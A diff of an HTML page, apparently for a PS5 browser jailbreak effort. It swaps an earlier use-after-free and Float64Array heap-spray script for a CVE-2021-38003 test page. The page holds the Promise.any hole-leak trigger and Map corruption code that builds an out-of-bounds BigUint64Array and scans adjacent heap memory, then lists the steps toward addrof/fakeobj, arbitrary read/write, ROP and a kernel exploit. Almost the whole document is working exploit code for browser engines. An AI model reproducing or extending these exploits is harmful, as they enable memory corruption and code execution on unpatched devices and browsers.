@@ -2,171 +2,203 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v58 - Float64Array Reclaim</title>
+<title>PS5 - CVE-2021-38003 Test</title>
 <style>
-body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
-button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
-pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
+body { background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }
+pre { white-space: pre-wrap; word-wrap: break-word; }
+.ok { color: #00ff41 } .er { color: #ff3333 } .hl { color: #00ffff } .mg { color: #ff00ff; font-weight: bold }
 </style>
 </head>
 <body>
-
-<h3>Final Exploit Chain — Float64Array Reclaim</h3>
-<p>Click the button. If the browser survives and returns a weird float, we have an info leak.</p>
-
-<button onclick="triggerFinal()">Trigger UAF + Float64Array Spray</button>
-
-<pre id="out"></pre>
-
+<pre id="o"></pre>
 <script>
-var out = document.getElementById("out");
-function log(m) { out.textContent += m + "\n"; }
+var o=document.getElementById("o");
+function log(m,c){var s=document.createElement("span");if(c)s.className=c;
+s.textContent=m+"\n";o.appendChild(s);o.scrollTop=o.scrollHeight}
 
-function triggerFinal() {
-    log("\n[*] Triggering EventTarget UAF...");
-    
-    var f = document.body.appendChild(document.createElement('iframe'));
-    var a = document.createElement('div');
-    var b = a.appendChild(document.createElement('div'));
-    var savedDoc = f.contentDocument;
-    
-    // First listener: free the iframe document
-    a.addEventListener('a', function() {
-        document.adoptNode(a);
-        f.remove();
-        log("[*] iframe removed. Document should be freed...");
-    });
-    
-    a.addEventListener('a', function() {});
-    
-    // Second listener: spray Float64Arrays then access freed memory
-    b.addEventListener('a', function() {
-        log("[*] Spraying Float64Arrays to reclaim freed Document...");
-        
-        // Spray Float64Arrays
-        var spray = [];
-        for (var i = 0; i < 10000; i++) {
-            var buf = new ArrayBuffer(64); // Similar size to Document header
-            var f64 = new Float64Array(buf);
-            f64[0] = 1.1;
-            f64[1] = 2.2;
-            f64[2] = 3.3;
-            f64[3] = 4.4;
-            f64[4] = 5.5;
-            f64[5] = 6.6;
-            f64[6] = 7.7;
-            f64[7] = 8.8;
-            spray.push(f64);
-        }
-        log("[*] Spray complete. 10000 Float64Arrays allocated.");
-        
-        // Now try to read the freed document
-        log("[*] Attempting to read freed Document properties...");
-        
-        try {
-            var nt = savedDoc.nodeType;
-            log("[*] savedDoc.nodeType: " + nt);
-            if (typeof nt === 'number' && nt !== 9) {
-                log("[+] WEIRD VALUE DETECTED! nodeType = " + nt, 'hl');
-            }
-        } catch(e) { log("[!] nodeType error: " + e.message); }
-        
-        try {
-            var nn = savedDoc.nodeName;
-            log("[*] savedDoc.nodeName: " + nn);
-            if (nn !== "#document") {
-                log("[+] WEIRD VALUE DETECTED! nodeName = " + nn, 'hl');
-            }
-        } catch(e) { log("[!] nodeName error: " + e.message); }
-        
-        try {
-            var url = savedDoc.URL;
-            log("[*] savedDoc.URL: " + url);
-            if (url !== "about:blank") {
-                log("[+] WEIRD VALUE DETECTED! URL = " + url, 'hl');
-            }
-        } catch(e) { log("[!] URL error: " + e.message); }
-        
-        try {
-            var title = savedDoc.title;
-            log("[*] savedDoc.title: " + title);
-            if (title !== "") {
-                log("[+] WEIRD VALUE DETECTED! title = " + title, 'hl');
-            }
-        } catch(e) { log("[!] title error: " + e.message); }
-        
-        try {
-            var ready = savedDoc.readyState;
-            log("[*] savedDoc.readyState: " + ready);
-            if (ready !== "complete") {
-                log("[+] WEIRD VALUE DETECTED! readyState = " + ready, 'hl');
-            }
-        } catch(e) { log("[!] readyState error: " + e.message); }
-        
-        try {
-            var cs = savedDoc.characterSet;
-            log("[*] savedDoc.characterSet: " + cs);
-            if (cs !== "UTF-8") {
-                log("[+] WEIRD VALUE DETECTED! characterSet = " + cs, 'hl');
-            }
-        } catch(e) { log("[!] characterSet error: " + e.message); }
-        
-        try {
-            var ct = savedDoc.contentType;
-            log("[*] savedDoc.contentType: " + ct);
-            if (ct !== "text/html") {
-                log("[+] WEIRD VALUE DETECTED! contentType = " + ct, 'hl');
-            }
-        } catch(e) { log("[!] contentType error: " + e.message); }
-        
-        try {
-            var de = savedDoc.documentElement;
-            log("[*] savedDoc.documentElement: " + de);
-            if (de !== null && de !== undefined) {
-                log("[+] WEIRD VALUE DETECTED! documentElement = " + de, 'hl');
-            }
-        } catch(e) { log("[!] documentElement error: " + e.message); }
-        
-        try {
-            var body = savedDoc.body;
-            log("[*] savedDoc.body: " + body);
-            if (body !== null && body !== undefined) {
-                log("[+] WEIRD VALUE DETECTED! body = " + body, 'hl');
-            }
-        } catch(e) { log("[!] body error: " + e.message); }
-        
-        try {
-            var loc = savedDoc.location;
-            log("[*] savedDoc.location: " + loc);
-            if (loc !== "about:blank") {
-                log("[+] WEIRD VALUE DETECTED! location = " + loc, 'hl');
-            }
-        } catch(e) { log("[!] location error: " + e.message); }
-        
-        try {
-            var dv = savedDoc.defaultView;
-            log("[*] savedDoc.defaultView: " + dv);
-            if (dv !== null && dv !== undefined) {
-                log("[+] WEIRD VALUE DETECTED! defaultView = " + dv, 'hl');
-            }
-        } catch(e) { log("[!] defaultView error: " + e.message); }
-        
-        try {
-            var ts = savedDoc.toString();
-            log("[*] savedDoc.toString(): " + ts);
-            if (ts !== "[object HTMLDocument]") {
-                log("[+] WEIRD VALUE DETECTED! toString = " + ts, 'hl');
-            }
-        } catch(e) { log("[!] toString error: " + e.message); }
-        
-        log("\n[*] Property scan complete.");
-        log("[*] If any value looks weird, we have type confusion with Float64Array!");
-    });
-    
-    b.dispatchEvent(new Event('a', { bubbles: true }));
-    
-    log("[+] Browser survived! No crash!");
+log("=== CVE-2021-38003 (Map Hole Leak) Test ===\n","mg");
+
+// Step 1: Check prerequisites
+log("[1] Checking prerequisites...");
+
+if (typeof BigInt !== 'function') {
+    log("  ❌ BigInt is NOT available","er");
+    log("  → Cannot proceed without BigInt","er");
+    log("\n=== Test Complete ===","mg");
+} else {
+    log("  ✅ BigInt available","ok");
 }
+
+if (typeof BigUint64Array !== 'function') {
+    log("  ❌ BigUint64Array is NOT available","er");
+} else {
+    log("  ✅ BigUint64Array available","ok");
+}
+
+if (typeof Promise !== 'undefined' && typeof Promise.any === 'function') {
+    log("  ✅ Promise.any available","ok");
+} else {
+    log("  ❌ Promise.any is NOT available","er");
+    log("  → CVE-2021-38003 cannot be triggered without Promise.any","er");
+    log("\n=== Test Complete ===","mg");
+}
+
+// Step 2: Try to trigger CVE-2021-38003
+log("\n[2] Attempting to trigger CVE-2021-38003...");
+log("  (This is the exact trigger from Y2JB exploit)\n");
+
+function trigger() {
+    let v1;
+    function f0(v4) {
+        v4(() => {}, v5 => {
+            v1 = v5.errors;
+        });
+    }
+    f0.resolve = function(v6) {
+        return v6;
+    };
+    let v3 = {
+        then(v7, v8) {
+            v8();
+        }
+    };
+    Promise.any.call(f0, [v3]);
+    return v1[1];
+}
+
+var hole = undefined;
+var triggerError = null;
+
+try {
+    hole = trigger();
+} catch(e) {
+    triggerError = e;
+}
+
+if (triggerError) {
+    log("  ❌ Trigger threw exception: " + triggerError.message,"er");
+    log("  → Bug is PATCHED or not triggerable","er");
+    log("\n=== Test Complete ===","mg");
+} else if (hole === undefined || hole === null) {
+    log("  ❌ Trigger returned undefined/null","er");
+    log("  → Bug is PATCHED on this browser","er");
+    log("  → v1[1] was not set (Promise.any didn't call reject)","er");
+    log("\n=== Test Complete ===","mg");
+} else {
+    log("  ✅ Trigger returned a value!","ok");
+    log("  → hole type: " + typeof hole,"hl");
+    log("  → hole value: " + String(hole),"hl");
+    log("  → CVE-2021-38003 may be ALIVE!","mg");
+    
+    // Step 3: Try Map corruption
+    log("\n[3] Attempting Map corruption for OOB access...");
+    log("  (This creates an OOB BigUint64Array)\n");
+    
+    try {
+        var map1;
+        var oob_arr;
+        var victim_arr;
+        var obj_arr;
+        
+        // GC pressure (replace gc() calls)
+        log("  [*] Applying GC pressure...");
+        for (var i = 0; i < 200; i++) {
+            new ArrayBuffer(0x100000);
+        }
+        
+        log("  [*] Creating Map corruption pattern (0x10 iterations)...");
+        for (var i = 0; i < 0x10; i++) {
+            map1 = new Map();
+            map1.set(1, 1);
+            map1.set(hole, 1);
+            map1.delete(hole);
+            map1.delete(hole);
+            map1.delete(1);
+            oob_arr = new BigUint64Array([0x4141414141414141n]);
+        }
+        
+        victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
+        obj_arr = [{}, {}];
+        
+        log("  [*] Triggering map corruption...");
+        map1.set(0x1e, -1);
+        
+        // More GC pressure
+        for (var i = 0; i < 200; i++) {
+            new ArrayBuffer(0x100000);
+        }
+        
+        map1.set(0x0, 0x1);
+        
+        log("  [*] oob_arr.length: 0x" + oob_arr.length.toString(16),"hl");
+        
+        // Step 4: Check for OOB access
+        log("\n[4] Scanning for OOB access...");
+        log("  (Looking for 0x4141414141414141 or 0x4343434343434343 in OOB range)\n");
+        
+        var found_41 = false;
+        var found_43 = false;
+        var found_other = false;
+        var first_oob_idx = -1;
+        
+        for (var i = 0; i < 200; i++) {
+            try {
+                var val = oob_arr[i];
+                if (val === 0x4141414141414141n) {
+                    if (i >= 1) {
+                        found_41 = true;
+                        log("  [+] Found 0x4141... at oob_arr[" + i + "]","ok");
+                    }
+                } else if (val === 0x4343434343434343n) {
+                    found_43 = true;
+                    if (first_oob_idx === -1) first_oob_idx = i;
+                    log("  [+] Found 0x4343... at oob_arr[" + i + "]","ok");
+                } else if (val !== 0n && val !== undefined) {
+                    if (!found_other) {
+                        found_other = true;
+                        log("  [+] Found non-zero value at oob_arr[" + i + "]: 0x" + val.toString(16),"hl");
+                    }
+                }
+            } catch(e) {
+                break;
+            }
+        }
+        
+        log("");
+        
+        if (found_43 || found_other) {
+            log("★ OOB ACCESS CONFIRMED! ★","mg");
+            log("");
+            log("  → We can read adjacent heap memory!","ok");
+            log("  → victim_arr found at oob_arr[" + first_oob_idx + "]","ok");
+            log("  → Next steps:","hl");
+            log("    1. Build addrof primitive (using obj_arr overlap)","hl");
+            log("    2. Build fakeobj primitive (using victim_arr overlap)","hl");
+            log("    3. Build read64/write64 (using fake ArrayBuffer)","hl");
+            log("    4. Find browser-specific ROP gadgets (NOT YouTube gadgets)","hl");
+            log("    5. Build syscall wrapper","hl");
+            log("    6. Load kernel exploit","hl");
+            log("");
+            log("  NOTE: ROP gadgets from Y2JB are for YouTube (libcobalt)","wr");
+            log("  Browser uses libSceWebKit2 — different addresses!","wr");
+            log("  We need to find new gadgets using read64 once we have it.","wr");
+        } else if (found_41 && !found_43) {
+            log("  ⚠️ Found self-reference but no OOB","wr");
+            log("  → Map corruption may have partially worked","wr");
+            log("  → Need to adjust heap layout","wr");
+        } else {
+            log("  ❌ No OOB access detected","er");
+            log("  → Map corruption did not work","er");
+            log("  → Bug may be partially patched","er");
+        }
+        
+    } catch(e) {
+        log("  ❌ Map corruption failed: " + e.message,"er");
+        log("  → " + (e.stack || "No stack trace"),"er");
+    }
+}
+
+log("\n=== Test Complete ===","mg");
 </script>
 </body>
 </html>
